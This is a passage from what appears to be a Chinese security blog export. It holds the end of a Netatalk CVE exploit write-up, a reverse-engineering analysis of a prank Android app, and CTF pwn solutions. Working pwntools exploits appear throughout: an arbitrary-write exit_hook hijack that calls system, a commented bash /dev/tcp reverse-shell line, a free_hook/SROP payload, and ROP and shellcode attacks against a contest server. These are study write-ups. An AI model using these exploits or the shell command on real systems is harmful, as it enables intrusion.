NULL,\n    afp_getdiracl, afp_setdiracl, afp_afschangepw, NULL,\t/*  96 - 103 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 104 - 111 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 112 - 119 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 120 - 127 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 128 - 135 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 136 - 143 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 144 - 151 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 152 - 159 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 160 - 167 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 168 - 175 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 176 - 183 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 184 - 191 */\n    afp_addicon, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 192 - 199 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 200 - 207 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 208 - 215 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 216 - 223 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 224 - 231 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 232 - 239 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 240 - 247 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 248 - 255 */\n};\n```\n\næœ‰äº†dsi_stream_receive()ï¼Œæˆ‘ä»¬å°±å¯ä»¥å…ˆé€šè¿‡memcpyè¦†å†™dsi->commandsæŒ‡é’ˆï¼Œå†é€šè¿‡`dsi_stream_read`å®ç°ä»»æ„åœ°å€å†™ã€‚\n\n```python\nfrom pwn import *\ncontext(endian='little')\n\nip = \"127.0.0.1\"\nport = 5566\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\ndef create_dsi(data):\n    dsi  = b'\\x00\\x04\\x00\\x01'\n    dsi += p32(0)\n    dsi += p32(len(data),endian='big')\n    dsi += p32(0)\n    dsi += data\n    return dsi\n\ndef send2(io,addr,data):\n    payload  = b'\\x01'+ p8(0x18)+ b'a'*0x10 + p64(addr)\n    io.send(create_dsi(payload))\n    io.recv()\n    io.send(create_dsi(data))\n    \nleak_addr = 0x7f5f3d138000\n# 0x7f5f3d138000 - 0x817000\nraw_input()\nlog.success(hex(leak_addr))\nio = remote(ip,port)\nsend2(io,leak_addr,\"deadbeef\")\n```\n\næŸ¥çœ‹å†…å­˜ï¼Œç›®æ ‡åœ°å€å·²è¢«æˆåŠŸä¿®æ”¹\n\n![image-20220107171022664](https://s2.loli.net/2022/01/07/HIhOEQa7ovAKfBe.png)\n\næ¼æ´ç‚¹3ï¼š\n\næœ‰äº†å‰ä¸¤ä¸ªæ¡ä»¶ï¼Œæœ€åä¸€æ­¥å°±å¯ä»¥è¿›è¡Œç²¾å‡†æ‰“å‡»äº†ï¼Œfree_hookå¯ä»¥çš„ï¼Œä¹‹å‰hitcon2019ç”¨çš„æ–¹æ³•å°±æ˜¯freehookï¼Œè¿™é‡Œç”¨ä¸€ç§æ–°å­¦çš„æ–¹æ³•ï¼Œä¸–äººç§°ä¹‹ä¸ºexit_hook\n\nè¿™é‡Œç®€å•è®°å½•ä¸€ä¸‹åŸç†ï¼Œå†™ä¸ªexit()çš„ç¨‹åºï¼Œè·Ÿè¿›ä¼šçŸ¥é“å®ƒçš„å…·ä½“æµç¨‹\n\n![image-20220107174429000](https://s2.loli.net/2022/01/07/lNHKwUvLImrxWkT.png)\n\n![image-20220107174612941](https://s2.loli.net/2022/01/07/ly3ITJw9mXcpiOr.png)\n\nè¿™é‡Œçš„<_dl_fini+105>æ˜¯rtld_lock_default_lock_recursiveå‡½æ•°ï¼Œrdiæ˜¯\\_rtld_gobal+2312\n\nçœ‹ä¸€ä¸‹æºç \n\n```c\n#ifdef SHARED\n   int do_audit = 0;\n  again:\n #endif\n   for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)\n     {\n       /* Protect against concurrent loads and unloads.  */\n       __rtld_lock_lock_recursive (GL(dl_load_lock));\n \n       unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;\n       /* No need to do anything for empty namespaces or those used for\n      auditing DSOs.  */\n       if (nloaded == 0\n #ifdef SHARED\n       || GL(dl_ns)[ns]._ns_loaded->l_auditing != do_audit\n #endif\n       )\n     __rtld_lock_unlock_recursive (GL(dl_load_lock));\n```\n\n![image-20220107183237588](https://s2.loli.net/2022/01/07/8o3jHzeifsOq4S6.png)\n\nè°ƒç”¨äº†ä¸¤ä¸ªå…³é”®çš„å‡½æ•°ï¼Œå¦‚ä¸Šï¼Œè¿™ä¸¤ä¸ªå‡½æ•°åœ¨_rtld_globalç»“æ„ä½“é‡Œé¢ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬èƒ½æ”¹å†™è¿™ä¸¤ä¸ªå‡½æ•°å…¶ä¸­ä¸€ä¸ªå°±èƒ½æ§åˆ¶æµåŠ«æŒå¹¶æ§åˆ¶å‚æ•°\n\nå‡½æ•°æŒ‡é’ˆï¼š\\_dl_rtld_lock_recursive (_rtld_global+3840)\n\nè°ƒç”¨å‚æ•°ï¼š\\_dl_load_lock (_rtld_global+2312)\n\n![image-20220107183731986](https://s2.loli.net/2022/01/07/CiS6FrvEe2DWUgt.png)\n\næ‰€ä»¥åªè¦æœ‰ä¸€æ¬¡ä»»æ„åœ°å€å†™å¤§å°0x600å­—èŠ‚å°±å¯ä»¥\n\n```python\nfrom pwn import *\ncontext(endian='little')\n\nip = \"127.0.0.1\"\nport = 5566\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\ndef create_dsi(data):\n    dsi  = b'\\x00\\x04\\x00\\x01'\n    dsi += p32(0)\n    dsi += p32(len(data),endian='big')\n    dsi += p32(0)\n    dsi += data\n    return dsi\n\ndef send2(io,addr,data):\n    payload  = b'\\x01'+ p8(0x18)+ b'a'*0x10 + p64(addr)\n    io.send(create_dsi(payload))\n    io.recv()\n    io.send(create_dsi(data))\n\nleak_addr = 0x7f5f3c921000\n# 0x7f5f3d138000 - 0x817000\nlog.success(hex(leak_addr))\nraw_input()\nlibc.address = leak_addr\nrtld = libc.address + 0xed4060\n#cmd = b'bash -c \"bash  -i>& /dev/tcp/ip/port 0<&1\"'\ncmd = \"cat /home/ld1ng/Desktop/netatalk/flag.txt\"\n# cmd = \"/bin/zsh\"\nio = remote(ip,port)\nsend2(io,rtld+2312,cmd.ljust(0x5f8,b'\\x00')+p64(libc.symbols['system']))\n```\n\næ”¹å†™åcmdæˆä¸ºsystemå‡½æ•°çš„å‚æ•°ï¼Œå½“ç¨‹åºexitåå³å¯æ‹¿åˆ°shell\n\n![image-20220107184859828](https://s2.loli.net/2022/01/07/RBxltWq8dzsPkvf.png)\n\n![image-20230517215417789](https://files.catbox.moe/sgzy8i.png)\n\n\n\n------\n\næœ€åè¯´ä¸€ä¸‹free_hookçš„æ–¹æ³•ï¼Œhitcon2019å®˜æ–¹çš„è§£æ³•ï¼Œå¸ƒå±€æ¯”è¾ƒå¤æ‚ï¼Œç”¨åˆ°äº†ä¸¤ä¸ªgadget\n\nè¦†å†™`__free_hook`ä¸º`__libc_dlopen_mode+56`\n\n![image-20220108141300714](https://s2.loli.net/2022/01/08/SYh5a7O3oFMNnIP.png)\n\nè¦†å†™`_dl_open_hook`ä¸º`_dl_open_hook+8`ï¼Œ`_dl_open_hook+8`ä¸º`fgetpos64+207`çš„è¿™ä¸ªmagic_gadget\n\n![image-20220108141653927](https://s2.loli.net/2022/01/08/ltYjxMVzS8Q3FHG.png)\n\n`mov rdi,rax ; call QWORD PTR [rax+0x20]`ï¼Œæ­¤æ—¶å› ä¸ºrdiæŒ‡å‘dl_open_hook+8ã€‚æˆ‘ä»¬å¯ä»¥å°†dl_open_hook+0x20å¤„ä¿®æ”¹ä¸ºsetcontext+53ï¼Œä»è€Œå®ç°ä»»æ„å‡½æ•°æ‰§è¡Œã€‚\n\nåœ¨dl_open_hookåé¢å¸ƒç½®sigFrameï¼Œæœ€ç»ˆè§¦å‘erræ—¶çš„freeï¼Œè°ƒç”¨system(cmd)æ‰§è¡Œåå¼¹shell\n\nå€Ÿç”¨å¤§ä½¬çš„å¸ƒå±€å›¾ï¼š\n\n![](https://gtrboy.github.io/img/netatalk/layout.png)\n\npayloadå¦‚ä¸‹ï¼š\n\n```python\nsigframe = SigreturnFrame()\nsigframe.rip = system_addr\nsigframe.rdi = free_hook + 8                   # cmd\nsigframe.rsp = free_hook                       # must be a writable address, as the stack of system func\n\npayload = b''.ljust(0xF, b'\\x00')              # padding\npayload += p64(libc_dlopen_mode_56)            # __free_hook, after this rop, rax = *dl_open_hook = dl_open_hook + 8\npayload += cmd.ljust(0x2bb8, b'\\x00')          # __free_hook + 8\npayload += p64(dl_open_hook + 8)               # dl_open_hook, *dl_open_hook = dl_open_hook+8, **dl_open_hook = fgetpos64+207\npayload += p64(fgetpos64_207)                # _dl_open_hook+8, let rdi = rax = _dl_open_hook + 8\npayload += b'A' * 0x18\npayload += p64(setcontext_53)             # dl_open_hook + 0x28 = rax + 0x20, call [rax+0x20] = setcontext+53\npayload += bytes(sigframe)[0x28:]           # now rdi = dl_open_hook + 8, thus we cut the offset from rdi to this pos\n```\n\n\n\n# 0x03 å°ç»“\n\nè½¬çœ¼2022å¹´äº†ï¼Œæ°´å¹³è¿˜æ˜¯å¤ªèœä»£ç çœ‹çš„å¥½ç´¯ï¼Œæ®è¯´è¿™ä¸ªCVEæ˜¯åŸä½œè€…åœ¨é£æœºä¸Šä¸‰ä¸ªå°æ—¶å‘ç°çš„...è†œæ‹œï¼Œå†™å®Œåšå®¢æ„Ÿè§‰è¿˜æ˜¯æœ‰æ”¶è·çš„\n","tags":["KNOWLEDGE","cve"],"categories":["LEARNING"]},{"title":"ä¸€ä»½ç¤¼ç‰©.apké€†å‘åˆ†æ","url":"/2021/03/20/ä¸€ä»½ç¤¼ç‰©.apk/","content":"\n# 0x00 å‰è¨€\n\nèµ·å› æ˜¯è¿™æ¬¾æ‰‹æœºappæ›¾æœ‰ä¸€æ®µæ—¶é—´é£å¸­å·é«˜æ ¡ï¼Œä¹Ÿçœ‹åˆ°å¾ˆå¤šåŒå­¦çš„â€œç¤¾æ­»â€ç°åœº\n\n![image-20210330190340454](https://i.loli.net/2021/03/30/edfwyVsqjOzNpJ8.png)\n\n# 0x01 apkåˆ†æ\n\né¦–å…ˆapktoolè§£åŒ…ï¼Œåœ¨assetsæ–‡ä»¶å¤¹ä¸‹\n\n![image-20210326232139705](https://i.loli.net/2021/03/26/OovItwByqYPdb8l.png)\n\nå‘ç°äº†mc.mp3ï¼Œå°±æ˜¯Oæ³¡çš„å¹¿å‘ŠéŸ³é¢‘ï¼Œè¿˜æœ‰ä¸€äº›.luaæ–‡ä»¶ï¼Œæ‰“å¼€ä¹‹åå‘ç°æ˜¯åŠ å¯†çš„ï¼Œä¸äº†è§£luaï¼Œä½†æ˜¯å¾ˆæœ‰å¯èƒ½æ˜¯å°±æ˜¯luaå†™çš„ï¼Œè¿™ç§è„šæœ¬è¯­è¨€å¾ˆå¯èƒ½éœ€è¦è¢«åŠ è½½\n\nåˆ†æjavaéƒ¨åˆ†ï¼Œjebæ‰“å¼€ä¸€ä»½ç¤¼ç‰©.apkï¼Œä¸ºäº†æ–¹ä¾¿å¯ä»¥ä¿®æ”¹AndroidManifest.xmlä¸­çš„`application`æ ‡ç­¾ï¼ŒåŠ ä¸€ä¸ª`android:debuggable=\"true\"`ï¼Œè¿™æ ·é‡æ–°ç”¨apktoolç¼–è¯‘å›å»å°±å¯ä»¥åŠ¨æ€è°ƒè¯•äº†ï¼Œ\n\nä½†æ˜¯è¿™æ ·çš„apkå¹¶ä¸èƒ½ç›´æ¥å®‰è£…ï¼Œéœ€è¦å¯¹å…¶é‡æ‰“åŒ…å¹¶è¿›è¡Œç­¾åã€‚\n\n```python\n#ç®¡ç†å‘˜\nkeytool -genkey -alias key.keystore -keyalg RSA -validity 30000 -keystore key.keystore\n\njarsigner -verbose -keystore key.keystore -signedjar 123.apk 123.apk key.keystore\n```\n\nç­¾å®Œåæ­£å¸¸å®‰è£…ï¼Œæ”¹ä¸€ä¸‹å¼€å‘è€…é€‰é¡¹\n\n![image-20210326233338463](https://i.loli.net/2021/03/26/SZhRvQpdXfkiJ1y.png)\n\nç•Œé¢å˜ä¸ºå¦‚ä¸‹æ•ˆæœï¼š\n\n![image-20210326233445700](https://i.loli.net/2021/03/26/RafnHcTD19jAMmJ.png)\n\næ‰¾åˆ°å¯åŠ¨ç±»ï¼Œè·Ÿè¿›åˆ°è¿™é‡Œ\n\n![image-20210329223248785](https://i.loli.net/2021/03/29/Fvy3iLjU5DqSbVp.png)\n\njavaæ°´å¹³å®åœ¨æœ‰é™ï¼Œé€»è¾‘æä¸æ¸…æ¥šï¼Œå¤šæ¬¡ä¸‹æ–­ç‚¹éƒ½æ²¡å‘½ä¸­\n\nä½†å‘ç°æœ‰åŠ è½½luaçš„ä»£ç ï¼Œ\n\n![image-20210330163439453](https://i.loli.net/2021/03/30/uznI2yXUFhl6ir9.png)\n\n\n\nå°è¯•æŠ“åŒ…ï¼Œå‘ç°è¿™ä¸ªç¨‹åºå¹¶æ²¡æœ‰ä»»ä½•çš„ç½‘ç»œå°åŒ…ä¼ è¾“ (fiddler)\n\n![image-20210330160100632](https://i.loli.net/2021/03/30/chdFxZ5DvjKAJy2.png)\n\nåœ¨jebä¸‹ï¼Œå‘ç°äº†å¤§é‡çš„æ··æ·†åŒ…ï¼Œè¿˜æœ‰ä¸€äº›ç™¾åº¦APIã€è…¾è®¯APIæ²¡è¢«è°ƒç”¨ï¼Œç”šè‡³è¿˜æœ‰ç½‘ä¸Šå¯ä»¥æœåˆ°Luaæºé¡¹ç›®çš„åŒ…ï¼Œä½¿ç”¨Androluaçš„åº“ï¼Œå¯è§è¯¥appæ˜¯é­”æ”¹è¿‡çš„\n\n![img](https://i.loli.net/2021/03/26/uKbf1ZdSHYyLavB.png)\n\nåæ¥ç½‘ä¸ŠæŸ¥åˆ°äº†Luaçš„Androidé¡¹ç›®ï¼Œæ˜¯å›½äººå¼€å‘çš„ä¸€ä¸ª lua å†™å®‰å“åº”ç”¨çš„æ¡†æ¶\n\nJavaéƒ¨åˆ†å¯èƒ½å¹¶ä¸æ˜¯åº”ç”¨çš„ä¸»ä½“éƒ¨åˆ†ï¼Œé‡è¦æ“ä½œå¯èƒ½ä¼šå†™åœ¨Luaä¸­ï¼Œ\n\nä¸Šå›¾ç›¸å…³ä»£ç å®é™…ä¸Šå¹¶æ²¡æœ‰è¢«è°ƒç”¨ï¼Œåªæ˜¯æ‰“åŒ…apkæ—¶å°è£…è¿›å»çš„ç±»ï¼Œå…³é”®é€»è¾‘ä½äºmain.luaä¸­ã€‚\n\nluaè„šæœ¬éœ€è¦åŠ è½½ï¼Œè€Œåœ¨åŠ è½½ä¹‹å‰è‚¯å®šæ˜¯è¦å…ˆè§£å¯†çš„ï¼Œæ‰€ä»¥åªè¦æ‰¾åˆ°è§£å¯†å‡½æ•°å°±å¯ä»¥äº†\n\nlibluajava.soæ–‡ä»¶ä¼šä½¿ç”¨`luaL_loadbuffer`æˆ–è€…`luaL_loadbufferx`å‡½æ•°å¯¹Luaè„šæœ¬è¿›è¡ŒåŠ è½½ï¼Œé€šå¸¸è§£å¯†ä¹Ÿåœ¨è¿™ä¸ªä½ç½®ï¼Œæœä¸å…¶ç„¶IDAå®šä½åˆ°è¿™ä¸ªå‡½æ•°\n\n```c\nint __fastcall luaL_loadbufferx(int a1, int array, size_t size, int path, int a5)\n{\n  int v5; // r10\n  size_t v6; // r6\n  int v7; // r11\n  int v8; // r8\n  _BYTE *v9; // r0\n  int v10; // r1\n  signed int v11; // r2\n  _BYTE *v13; // [sp+8h] [bp-28h]\n  size_t v14; // [sp+Ch] [bp-24h]\n\n  v5 = a1;\n  v6 = size;\n  v7 = array;\n  v8 = path;\n  v13 = array;\n  v14 = size;\n  if ( *array == 0x1B && *(array + 1) != 0x4C )\n  {\n    v9 = malloc(size);\n    if ( v6 )\n    {\n      *v9 = 27;\n      if ( v6 != 1 )\n      {\n        v10 = 0;\n        v11 = 1;\n        do\n        {\n          v10 += v6;\n          v9[v11] = *(v7 + v11) ^ (v10\n                                 + ((((-2139062143LL * v10) >> 32) + v10) >> 7)\n                                 + ((((-2139062143LL * v10) >> 32) + v10) < 0));\n          ++v11;\n        }\n        while ( v6 != v11 );\n      }\n    }\n    v13 = v9;\n  }\n  return j_lua_load(v5, sub_E0B6, &v13, v8, a5);\n}\n```\n\n![image-20210330160703541](https://i.loli.net/2021/03/30/qL7plJKnNtZITur.png)\n\nå‚æ•°åæ˜¯æ”¹è¿‡çš„ï¼Œifè¯­å¥åˆ¤æ–­æ˜¯å¦éœ€è¦è§£å¯†ï¼Œå¦åˆ™ç›´æ¥æ‰§è¡Œj_lua_loadåŠ è½½æ–‡ä»¶ï¼Œ\n\næ‰¾åˆ°äº†åŸå‡½æ•°ç„¶åäº†è§£å„ä¸ªå‚æ•°çš„æ„ä¹‰è¿›è¡Œé€†å‘å³å¯ï¼Œ(å…¶å®ä¸ç®—é€†å‘è€Œæ˜¯æ­£å‘é€»è¾‘å†èµ°ä¸€éå°±è¡Œ)ï¼Œ\n\næˆ–è€…IDAåŠ¨è°ƒåœ¨returnä¸Šé¢ä¸‹ä¸ªæ–­ç‚¹ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°è¿™ådumpå‡ºå†…å­˜æ•°æ®ä¹Ÿè¡Œ\n\n```c\n>LUALIB_API int luaL_loadbufferx (lua_State *L, const char *buff, size_t size,\n                                 const char *name, const char *mode) {\n  LoadS ls;\n  ls.s = buff;\n  ls.size = size;\n  return lua_load(L, getS, &ls, name, mode);\n}\n```\n\né€†å‘è„šæœ¬å¦‚ä¸‹\n\n```python\nfrom ctypes import *\nimport sys\ndef decrypt(filename):\n    s = open(filename, 'rb').read()\n    outfile = 'out.lua'\n    if s[0] == chr(0x1b) and s[1] != chr(0x4c):\n        rst = chr(0x1b)\n        size = len(s)\n        v10 = 0\n        for i in range(1, size):\n            v10 += size\n            v = (c_ulonglong(-2139062143 * v10).value >> 32) + v10\n            v1 = c_uint(v).value >> 7\n            v2 = c_int(v).value < 0\n            rst += chr(ord(s[i]) ^ (v10 + v1 + v2) & 0xff)\n        with open(outfile, 'wb') as f:\n            f.write(rst)\n    else:\n        pass\ndef foo():\n    # print len(sys.argv)\n    if len(sys.argv) == 2:\n        filename = sys.argv[1]\n    else:\n        filename = 'main.lua'\n    decrypt(filename)\nif __name__ == '__main__':\n    foo()\n```\n\nï¼ˆå…¶ä¸­ctypesä¹‹å‰ç”¨è¿‡ï¼Œåˆå¿˜äº†ï¼Œåœ¨è¿™è®°ä¸€ä¸‹ï¼‰\n\nç„¶åè§£å¯†ä¸‰ä¸ªlua\n\n![image-20210327000258919](https://i.loli.net/2021/03/27/lw13gM2RXAvLWHh.png)\n\nè¿˜æ˜¯ä¹±ç ï¼Œäºæ˜¯æœç´¢LuaSï¼Œäº†è§£åˆ°ä¸Pythonç”Ÿæˆpycå­—èŠ‚ç ä¸€æ ·ï¼ŒLuaç¨‹åºä¹Ÿæœ‰è‡ªå·±çš„å­—èŠ‚ç æ ¼å¼luacã€‚Luaç¨‹åºåœ¨åŠ è½½åˆ°å†…å­˜ä¸­åï¼ŒLuaè™šæ‹Ÿæœºç¯å¢ƒä¼šå°†å…¶ç¼–è¯‘ä¸ºLuacå­—èŠ‚ç \n\néœ€è¦ç”¨å·¥å…·åç¼–è¯‘\n\n```\njava -jar .\\unluac_2021_03_19b.jar .\\out.lua > main.lua\n```\n\näºæ˜¯å¾—åˆ°æºç main.lua\n\n```java\nrequire(\"import\")\nimport(\"android.app.*\")\nimport(\"android.os.*\")\nimport(\"android.widget.*\")\nimport(\"android.view.*\")\nimport(\"android.view.View\")\nimport(\"android.content.Context\")\nimport(\"android.media.MediaPlayer\")  //æ’­æ”¾å™¨\nimport(\"android.media.AudioManager\")   //éŸ³é‡æ§åˆ¶\nimport(\"com.androlua.Ticker\")\nactivity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI) //è°ƒå¤§éŸ³é‡\nactivity.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)//éšè—ç³»ç»Ÿå¯¼èˆªæ ï¼Œå¹¶è¿›å…¥æ²‰æµ¸æ¨¡å¼ï¼ˆå…¨å±ï¼‰\nm = MediaPlayer()\nm.reset()\nm.setDataSource(activity.getLuaDir() .. \"/mc.mp3\") //å¹¿å‘Š\nm.prepare()\nm.start()\nm.setLooping(true)//å¾ªç¯\nti = Ticker() //è®¡æ—¶å™¨è§¦å‘\nti.Period = 10  //é—´éš”10\nfunction ti.onTick()\n  activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI)//åŒä¸Š\n  activity.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)//éšè—navbar\nend\nti.start()//å¼€å¯tickerï¼Œæ¯10msæ‰§è¡Œä¸€æ¬¡ä¸Šé¢çš„å‡½æ•°\nfunction onKeyDown(A0_0, A1_1) //ç›‘å¬æŒ‰é”®\n  if string.find(tostring(A1_1), \"KEYCODE_BACK\") ~= nil then //å¦‚æœæŒ‰é”®æ˜¯è¿”å›é”®\n    activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI)\n  end //ç›¸å½“äºæŠŠè¿”å›é”®å˜æˆäº†éŸ³é‡æœ€å¤§é”®\n  return true\nend\n```\n\nå¤§ä½“æµç¨‹å¦‚ä¸‹ï¼š\n\nå°†ç³»ç»ŸéŸ³é‡è°ƒè‡³æœ€å¤§\n\néšè—ç³»ç»Ÿå¯¼èˆªæ ï¼Œå¹¶è¿›å…¥æ²‰æµ¸æ¨¡å¼ï¼ˆå…¨å±ï¼‰\n\næ¯10tickï¼Œé‡å¤ä»¥ä¸Šæ­¥éª¤ä½¿å¾—æ— æ³•ä¸»åŠ¨è°ƒä½éŸ³é‡\n\nå¾ªç¯æ’­æ”¾éŸ³é¢‘æ–‡ä»¶`mc.mp3`ï¼Œå¹¶åŠ«æŒè¿”å›é”®\n\n(ä»…å½“ä¸¤æ¬¡è¿”å›çš„æ—¶é—´é—´éš”å°äº0ç§’æ˜¯æ‰ä¼šé€€å‡ºè½¯ä»¶ï¼Œå¦åˆ™å°±ä¼šä¸€ç›´æ’­æ”¾éŸ³ä¹)\n\nå¦‚æœé”å®šä½ çš„homeé”®ï¼Œç„¶åå†å®ç°å¼€æœºè‡ªå¯åŠ¨ï¼Œè¿™æ ·çš„è¯ï¼Œè¿™ç§è½¯ä»¶å°±å¯ä»¥å˜æˆæµæ°“å‹’ç´¢è½¯ä»¶äº†\n\n# 0x02 å°ç»“\n\nè¿™æ ·çœ‹æ¥ä¼¼ä¹ç¨‹åºå¹¶æ²¡ä»€ä¹ˆå±å®³ï¼Œåªæ˜¯ä¸ªæ¶æè½¯ä»¶\n\nä¸è¦éšä¾¿å®‰è£…æ¥å†ä¸æ˜çš„è½¯ä»¶ï¼Œapkå®‰è£…åŒ…å®åœ¨æ˜¯å¤ªå®¹æ˜“è¢«æ”¹åŒ…äº†ã€‚\n\n![img](https://pic4.zhimg.com/80/v2-f419c927151fbeb12d25e9f5881c38cf_720w.jpg?source=1940ef5c)\n\n\n\n**referenceï¼š**  https://cloud.tencent.com/developer/article/1718949","tags":["KNOWLEDGE"],"categories":["LEARNING"]},{"title":"CUMTCTF2021 Winter éƒ¨åˆ†wp","url":"/2021/02/01/cumtctf2021/","content":"\n# 0x00 å‰è¨€\n\nè€å¸ˆè®©æçš„ä¸€æ¬¡å¯’å‡èµ›ï¼Œä¸€å…±7å¤©... æ²¡æ‰“ï¼ŒæŠ½ç©ºä¸Šå»åšäº†åšé¢˜ç›®\n\nä¸»è¦çœ‹äº†å¯†ç å’Œmiscï¼Œè·Ÿç€ç‚œå“¥å­¦äº†ä¸€ç‚¹æ™ºèƒ½åˆçº¦ï¼Œè¿˜æ˜¯æŒºæœ‰æ”¶è·çš„\n\n# 0x01 PWN\n\n## 1.pwn1\n\nç®€å•ROPï¼Œï¼Œï¼Œè²Œä¼¼ç¨‹åºæä¾›çš„æ ˆåœ°å€æ²¡ä»€ä¹ˆç”¨ï¼Œï¼Œï¼Œå¯ä»¥ç›´æ¥æ³„éœ²gotåœ°å€\n\nä½†æœ¬ç€å……åˆ†åˆ©ç”¨é¢˜ç›®æ‰€ç»™æ¡ä»¶çš„åŸåˆ™ï¼Œå¯ä»¥é€‰æ‹©æ³„éœ²æ ˆåœ°å€\n\n```python\nfrom pwn import *\nelf=ELF('./pwn1')\nlibc = ELF('libc6-i386_2.23-0ubuntu11.2_amd64.so')\n# p = elf.process()\ncontext.log_level = 'debug'\np = remote('219.219.61.234',40000)\n\nprintf_plt=elf.plt['printf']\nread_got=elf.got['read']\nmain_addr=0x080484EB\ninfo(\"printf_plt = \" + hex(printf_plt))\np.recv()\n# buf = int((p.recvline().strip('\\n'))[-8:],16)\n# info(\"buf : \"+ hex(buf))\n# payload=28*'a'+'b'*4+ p32(printf_plt)+p32(main_addr)+p32(buf+0x30)\npayload=28*'a'+'b'*4+ p32(printf_plt)+p32(main_addr)+p32(read_got)\np.sendline(payload)\n# libc_base=u32(p.recv(4)) - libc.sym['__libc_start_main'] -247\nlibc_base=u32(p.recv(4)) - libc.sym['read']\ninfo(\"libc_base : \" + hex(libc_base))\nsystem_addr = libc_base + libc.sym['system']\nbin_sh_addr = libc_base + libc.search('/bin/sh\\x00').next()\npayload2=0x1c*'a'+p32(0)+p32(system_addr)+p32(0)+p32(bin_sh_addr)\np.sendline(payload2)\np.interactive()\n#CUMTCTF{97a866db5e67c9cc6a553e211}\n```\n\n## 2.easystack\n\nè¿˜è®°å¾—ä½ å½“å¹´åå­—å«startï¼Œæ€ä¹ˆå°±æ”¹åäº†å‘¢/æ»‘ç¨½\n\n```python\nfrom pwn import *\ncontext.log_level = \"debug\"\n# p = process('./easystack')\np = remote('219.219.61.234',20002)\npayload = 'A'*0x10 + p32(0x8048087)\np.sendafter(\"winter:\",payload)\nesp = u32(p.recv(4))\ninfo(hex(esp))\nprint 'esp: '+hex(esp)\nshellcode='\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80'\n#shellcode = asm('xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov al,0xb;int 0x80')\npayload = 'A'*0x10 + p32(esp+0x10) + shellcode\np.sendline(payload)\np.interactive()\n\n#CUMTCTF{Hello_pwn_this_is_stack_overfl0w}\n```\n\n## 3.pwn3\n\næœ€åŸºç¡€çš„æ ˆè¿ç§»ï¼Œæ²¡canaryå¹¶ä¸”ç¨‹åºå‘Šè¯‰äº†æ ˆåœ°å€ï¼Œè¿ç§»åˆ°æ ˆä¸Šå³å¯\n\n```python\nfrom pwn import *\ncontext.log_level=\"debug\"\n# context.arch='amd64'\nelf=ELF('./pwn3')\n# p=elf.process()\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") \np=remote(\"219.219.61.234\",40001)\n\nleave_ret=0x0000000000400896\npop_rdi=0x0000000000400963\nputs_plt=elf.plt['puts']\nputs_got=elf.got['puts']\n\np.recvuntil(\"a present:0x\")\nstack=int((p.recvline().strip('\\n')),16)\ninfo(hex(stack))\n\npayload=p64(pop_rdi)+p64(puts_got)+p64(puts_plt) +p64(0x400898) \npayload+=p64(stack-8)+p64(leave_ret)\np.send(payload)\np.recv()\nlibc_base =u64(p.recvline().strip('\\n')[-6:].ljust(8,\"\\x00\")) - libc.sym['puts']\ninfo(hex(libc_base))\nsystem=libc_base+libc.sym['system']\nbinsh =libc_base + libc.search('/bin/sh\\x00').next()\np.recvuntil(\"a present:0x\")\nstack=int((p.recvline().strip('\\n')),16)\ninfo(hex(stack))\n\npayload2=p64(pop_rdi) +p64(binsh)+p64(system)+p64(0x400898) \npayload2+=p64(stack-8)+p64(leave_ret)\np.send(payload2)\np.interactive()\n#CUMTCTF{22e369b8e6a571db987cec98}\n```\n\n## 4.pwnvm\n\nè™šæ‹Ÿæœº+æ 